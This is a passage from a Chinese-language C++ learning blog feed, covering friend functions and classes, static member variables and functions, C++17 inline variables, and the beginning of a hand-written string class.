class="keyword">return</span> <span class="keyword">this</span>-&gt;hp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(Box &amp;b)</span></span>&#123;</span><br><span class="line">b.hp = <span class="number">100</span>;</span><br><span class="line">std::cout &lt;&lt; b.<span class="built_in">getHp</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/friend/002.png" class=""><p>结果都没问题，也就是说友元函数可以访问类的私有成员。</p><hr><p>还有就是类和函数啥的因为都是顺序执行，所以当一个类中调用另一个类的时候，这个类如果在后面才定义，编译器也是会报错的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHp</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;hp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">test</span><span class="params">(Box &amp;b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">getHP</span><span class="params">(Box &amp;b1, Hz &amp;h1)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hz</span>&#123;</span><br><span class="line">    <span class="type">int</span> hp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>就拿这种情况，我们getHP参数调用Box本身和Hz，但是Hz在后面定义.</p><img src="/2022/06/24/friend/003.png" class=""><p>这个时候就要学习函数，将声明放置于顶部，定义放在后面。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hz</span>;       <span class="comment">//声明</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHp</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;hp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">test</span><span class="params">(Box &amp;b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">getHP</span><span class="params">(Box &amp;b1, Hz &amp;h1)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hz</span>&#123;</span><br><span class="line">    <span class="type">int</span> hp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样就解决这个小毛病。</p><hr><h2 id="友元类"><a href="#友元类" class="headerlink" title="友元类"></a>友元类</h2><p>写法差不多，<code>friend class 类名</code>。<br>作用就是可以创建这个类的对象，可以访问类中的私有成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hz</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHp</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;hp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">test</span><span class="params">(Box &amp;b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">getHP</span><span class="params">(Box &amp;b1, Hz &amp;h1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Hz</span>;       <span class="comment">//声明友元类Hz</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hz</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getMp</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box b1;</span><br><span class="line">std::cout &lt;&lt; b1.<span class="built_in">getHp</span>() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里还涉及到人际关系，就是你拿它当朋友，但是它不一定拿你当朋友。<br>具体表现在类中，就是虽然你声明了一个友元类，它可以访问你了，但是你不能访问它。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">getMp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Hz h1;</span><br><span class="line">    h1. <span class="comment">//一个成员都看不到。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还挺勾心斗角的。。。<br>这个解决方法在于双方都要声明，双认证一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hz</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHp</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;hp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getMp</span><span class="params">()</span></span>&#123;</span><br><span class="line">Hz h1;</span><br><span class="line">h1.mp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">test</span><span class="params">(Box &amp;b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">getHP</span><span class="params">(Box &amp;b1, Hz &amp;h1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Hz</span>;    <span class="comment">//声明</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hz</span>&#123;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getMp</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box b1;</span><br><span class="line">std::cout &lt;&lt; b1.<span class="built_in">getHp</span>() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Box</span>;   <span class="comment">//声明</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但是显然这种逻辑关系很麻烦。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>但是要注意朋友的朋友不一定就是朋友<br><strong>即A,有朋友B和C，但是B和C之间不一定就是朋友，因为友元不具备关系传递。</strong></p><p>而且友元本质上会破坏类的封装性，所以只有万不得已的情况下才会选择友元，友元这种不是一种平等的关系。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态成员变量和函数</title>
      <link href="/2022/06/24/staticmember/"/>
      <url>/2022/06/24/staticmember/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>成员变量就是class中定义的变量，不论是public下还是private下，都是这个类的成员变量<br>那么静态成员变量，就是加上关键字<code>static</code>。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><hr><h2 id="静态成员变量"><a href="#静态成员变量" class="headerlink" title="静态成员变量"></a>静态成员变量</h2><p>静态变量的生命周期会随着程序结束才释放，而是脱离<code>&#123;&#125;</code>作用域。<br>不过c++处理这种可能还是希望放在未命名的命名空间里。</p><p>因为static的生命周期要等到程序结束，所以说</p><ol><li>所有类在实例化之后，共享类中的静态成员变量</li><li>而且类在没有实例化的情况下，静态变量已经有了空间，仍然可以访问到</li><li>那么可以说类的静态成员变量并不是完全属于类，就跟成员函数有点相似</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为类的特殊性，所以静态成员变量也是无法直接初始化的。</p><img src="/2022/06/24/staticmember/000.png" class=""><p>你可以选择在外部初始化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Box::count = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>但是注意，这里是在Box类这个作用域下的count<br>如果你是<code>int count=100;</code> 这是两个不相干的变量。</p><hr><h3 id="第一个特性"><a href="#第一个特性" class="headerlink" title="第一个特性"></a>第一个特性</h3><p>其次是共享静态成员变量。也就是说当你某个实例化对象改变了count的值，其它的实例化对象中的count也会发生改变，因为它们本身就是一个东西。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Box b1, b2, b3, b4;</span><br><span class="line">b1.count++;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/staticmember/001.png" class=""><p>通过改变实例b1，发现b3的count值也改变，有疑虑最直接的就是打印地址</p><img src="/2022/06/24/staticmember/002.png" class=""><p>b2和b3的count地址是一样的。<strong>足以说明静态成员变量共享内存</strong></p><blockquote><p>其实就是一个没有外部属性的全局变量hh。</p></blockquote><hr><h3 id="第二个特性"><a href="#第二个特性" class="headerlink" title="第二个特性"></a>第二个特性</h3><p>说没有实例化时也能访问count，这个其实在刚才外部初始化的时候就说明了这个问题<br><code>int Box::count = 100;</code></p><p>那么我们的印证方法也是修改它</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Box::count = <span class="number">200</span>;</span><br><span class="line">std::cout &lt;&lt; Box::count &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; b1.count &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/staticmember/003.png" class=""><p>显然在<code>Box::</code>下可以直接访问，我们在类中再定义一个正常的成员变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> count;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/staticmember/004.png" class=""><p>报错也说了，非静态成员必须与特定对象相对，就是说要实例化后才能用。</p><hr><h3 id="第三个特性"><a href="#第三个特性" class="headerlink" title="第三个特性"></a>第三个特性</h3><p>按照常规惯例sizeof查看一个类可以直接算，但是包含静态变量的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> count;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>你会发现是个4。</p><img src="/2022/06/24/staticmember/005.png" class=""><p>有疑虑注释掉hp变量再看。</p><img src="/2022/06/24/staticmember/006.png" class=""><blockquote><p>这个1前面说过，是为了防止空类多个实例化的时候共用一个地址导致逻辑混乱的问题</p></blockquote><p>不过就足以说明第三个特性，静态成员变量不完全属于类，本质上就是一个没有外部属性的全局变量。只不过给他套上了类的作用域。</p><hr><h3 id="新特性初始化静态成员变量"><a href="#新特性初始化静态成员变量" class="headerlink" title="新特性初始化静态成员变量"></a>新特性初始化静态成员变量</h3><p>在c++17中我们学过它除了内联函数还可以内联变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">inline</span> <span class="type">static</span> <span class="type">int</span> count&#123;<span class="number">100</span>&#125;;</span><br><span class="line"><span class="comment">//int hp;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意要将项目属性切到c++17标准</strong></p><p>不过毕竟是新特性，有些项目还是遵循老版本，所以不建议乱用。</p><p>内联变量的起因就是ODR一次定义原则，一个变量或者实体只能出现在一个编译单元内，除非这个变量用inline修饰。<br>就是眼下这种场景，一个类中有一个静态成员变量，而且在外部进行了一次初始化，本身是符合ODR一次定义原则。但是多个.cpp源文件同时包含这个头文件的时候，编译器在链接阶段就会发生报错。</p><hr><h3 id="套构造和析构"><a href="#套构造和析构" class="headerlink" title="套构造和析构"></a>套构造和析构</h3><p>既然静态成员变量共享的，就可以用它判断一共实例化了几个对象。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">inline</span> <span class="type">static</span> <span class="type">int</span> count&#123;&#125;;</span><br><span class="line"><span class="comment">//int hp;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCount</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/staticmember/007.png" class=""><p>看到实例化了4个对象，打印也是4。没啥问题。</p><p>但是，没啥问题就是有大问题，我们知道有声明周期这个东西，目前的实例都是在main函数发生的，如果在其他地方也发生过实例化，那么count还是会自增，就不符合逻辑。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box b1, b2, b3, b4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/staticmember/008.png" class=""><p>按道理离开了test函数里面的就释放了，但是count没有减去。</p><p>当然解决方法就在析构函数上，构造的时候自增了，析构就自减就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">inline</span> <span class="type">static</span> <span class="type">int</span> count&#123;&#125;;</span><br><span class="line"><span class="comment">//int hp;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCount</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Box</span>()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;count--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再回过头来看，发现符合预期效果了。</p><img src="/2022/06/24/staticmember/009.png" class=""><hr><h3 id="const"><a href="#const" class="headerlink" title="const"></a>const</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">const</span> <span class="type">static</span> <span class="type">int</span> count&#123;&#125;;</span><br><span class="line"><span class="comment">//int hp;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;count++; <span class="comment">//error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCount</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Box</span>()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;count--; <span class="comment">//error</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>const修饰过之后是可以直接在里面初始化。但是构造和析构就无法改变了，因为是一个常量。</p><p>然而在类外初始化<code>const int Box::count&#123;&#125;;</code><br>也还是要注意上面说的问题，ODR一次定义原则，定义在外面，被多个源文件包含，在链接阶段会产生错误。</p><p>解决办法也还是要么在类中就初始化限定了，要么就是使用c++17的特性 inline变量。<br>即<code>inline const static int count&#123;&#125;;</code></p><p>虽然很臭屁，但是还是要知道。</p><hr><h2 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板就这样，多个static关键字修饰。</p><ol><li>不管有没有实例化类，也是都可以访问静态成员函数</li><li>类的静态成员函数不能访问非静态的成员变量</li><li>类的静态成员函数不能是const</li><li>类的静态成员函数不能使用this指针</li></ol><hr><h3 id="第一特性"><a href="#第一特性" class="headerlink" title="第一特性"></a>第一特性</h3><p>很简单。。就跟之前访问静态成员变量一个操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;static function&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/24/staticmember/010.png" class=""><p>就这样就完事了。</p><hr><h3 id="第二特性"><a href="#第二特性" class="headerlink" title="第二特性"></a>第二特性</h3><img src="/2022/06/24/staticmember/011.png" class=""><p>因为静态成员函数不需要实例化就能调用，但是hp是只有实例化后能会分配内存空间，才能调用的。<br>所以静态成员函数只能访问静态成员变量，因为二者都是不需要实例化就能调用，底层来讲就是内存都早早分配了。</p><hr><h3 id="第三特性"><a href="#第三特性" class="headerlink" title="第三特性"></a>第三特性</h3><p>与其说不能是const，或者应该说用不到const。<br>我们说const实例化一个对象，只能调用const的函数，但是静态成员函数不需要实例化就能调用，所以即便不是const函数，他也能调用。</p><img src="/2022/06/24/staticmember/012.png" class=""><hr><h3 id="第四特性"><a href="#第四特性" class="headerlink" title="第四特性"></a>第四特性</h3><p>这个和老二有相似处，因为静态成员函数不需要实例化就能调用，它无法正常的访问一个需要实例化才能调用的成员变量，既然访问不了需要实例化才能访问的，那么this指针也就用不到了，无效了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>内存分配还是绕来绕去</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hstring</title>
      <link href="/2022/06/23/hstring/"/>
      <url>/2022/06/23/hstring/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了基本的构造函数、拷贝函数、析构函数<br>可以自己试着写个丐版的string。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><ol><li>hstring str(“哈哈哈”);   &#x2F;&#x2F;构造函数</li><li>hstring strA(str);      &#x2F;&#x2F;拷贝函数</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hstring</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;hs)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">hstring</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>大概框架就是这样，但是要注意，套string就没意思了。<br>char或者char*的话要注意内存分配的事。</p><p>想了下大概是char*比较合适，毕竟初始化的时候鬼知道这个字符串多长。<br>然后提到长度，还要写个成员变量，和成员函数去统计出这个长度。</p><hr><h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *c_str;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> len;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Length</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *hs)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (hs[<span class="keyword">this</span>-&gt;len++]);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">hstring</span>()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span>* hs)&#123;</span><br><span class="line">c_str = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">Length</span>(hs)];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i 